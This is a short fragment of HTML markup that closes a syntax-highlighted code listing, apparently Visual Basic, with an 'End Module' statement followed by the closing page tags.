</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Module</span><span class="sc0">
</span></div></body>
</html>
